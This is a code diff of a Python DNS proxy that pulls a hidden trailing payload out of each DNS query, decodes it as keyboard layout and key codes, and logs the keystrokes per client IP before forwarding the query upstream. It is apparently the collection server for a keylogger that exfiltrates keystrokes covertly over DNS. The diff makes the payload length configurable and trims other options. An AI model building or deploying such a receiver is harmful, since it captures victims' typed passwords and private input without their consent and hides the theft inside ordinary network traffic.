@@ -1,24 +1,19 @@
 import argparse
 import os
-import json
 import socket
 import time
-
 import yaml
+
 from dnslib import QTYPE, RCODE, DNSRecord
 from dnslib.server import BaseResolver, DNSHandler, DNSLogger, DNSServer
 
-LOCAL_HOST = "0.0.0.0"  # Listen on all available interfaces
-LOCAL_PORT = 53  # Port for the UDP proxy to listen on
-REMOTE_HOST = "8.8.8.8"  # Replace with the remote server's IP
-REMOTE_PORT = 53  # Port of the remote server
 qw_key_map = yaml.safe_load(open("qwerty.yml"))
 az_key_map = yaml.safe_load(open("azerty.yml"))
 key_maps = {0: qw_key_map, 1: az_key_map}
 
 mods_str_rep = {k: {v["keys"][mod]:mod for mod in v["mod"]} for k,v in key_maps.items() }
 keys = {}
-
+PAYLOAD_LEN = int(os.environ["PAYLOAD_LEN"])
 
 
 class ProxyResolver(BaseResolver):
@@ -54,7 +49,7 @@ class PassthroughDNSHandler(DNSHandler):
             keys[client_ip] = []
 
         try:
-            payload = data[-8:]
+            payload = data[-PAYLOAD_LEN:]
             key_events = zip(payload[::2], payload[1::2])
             for layout, code in key_events:
                 if key_map := key_maps.get(layout):
@@ -76,7 +71,8 @@ class PassthroughDNSHandler(DNSHandler):
             print(e)
             pass
 
-        data = bytearray(data[:-8])
+        data = bytearray(data[:-PAYLOAD_LEN])
+        # add recursion byte
         data[2:4] = bytes.fromhex("0120")
 
         request = DNSRecord.parse(bytes(data))
@@ -118,61 +114,34 @@ if __name__ == "__main__":
         metavar="<dns server:port>",
         help="Upstream DNS server:port (default:8.8.8.8:53)",
     )
-    p.add_argument(
-        "--tcp", action="store_true", default=False, help="TCP proxy (default: UDP only)"
-    )
-    p.add_argument(
-        "--timeout",
-        "-o",
-        type=float,
-        default=5,
-        metavar="<timeout>",
-        help="Upstream timeout (default: 5s)",
-    )
-    p.add_argument(
-        "--strip-aaaa",
-        action="store_true",
-        default=False,
-        help="Retuen NXDOMAIN for AAAA queries (default: off)",
-    )
-    p.add_argument(
-        "--passthrough",
-        action="store_true",
-        default=False,
-        help="Dont decode/re-encode request/response (default: off)",
-    )
+     
     p.add_argument(
         "--log",
         default="request,reply,truncated,error",
         help="Log hooks to enable (default: +request,+reply,+truncated,+error,-recv,-send,-data)",
     )
-    p.add_argument(
-        "--log-prefix",
-        action="store_true",
-        default=False,
-        help="Log prefix (timestamp/handler/resolver) (default: False)",
-    )
+
     args = p.parse_args()
 
-    args.dns, _, args.dns_port = args.upstream.partition(":")
-    args.dns_port = int(args.dns_port or 53)
+    dns, _, dns_port = args.upstream.partition(":")
+    dns_port = int(dns_port or 53)
 
     print(
         "Starting Proxy Resolver (%s:%d -> %s:%d) [%s]"
         % (
             args.address or "*",
             args.port,
-            args.dns,
-            args.dns_port,
-            "UDP/TCP" if args.tcp else "UDP",
+            dns,
+            dns_port,
+            "UDP",
         )
     )
 
     udp_server = DNSServer(
-        ProxyResolver(args.dns, args.dns_port, args.timeout, args.strip_aaaa),
+        ProxyResolver(dns, dns_port, timeout=5, strip_aaaa=False),
         port=args.port,
         address=args.address,
-        logger=DNSLogger(args.log, prefix=args.log_prefix),
+        logger=DNSLogger(args.log, prefix=True),
         handler=PassthroughDNSHandler,
     )
     udp_server.start()
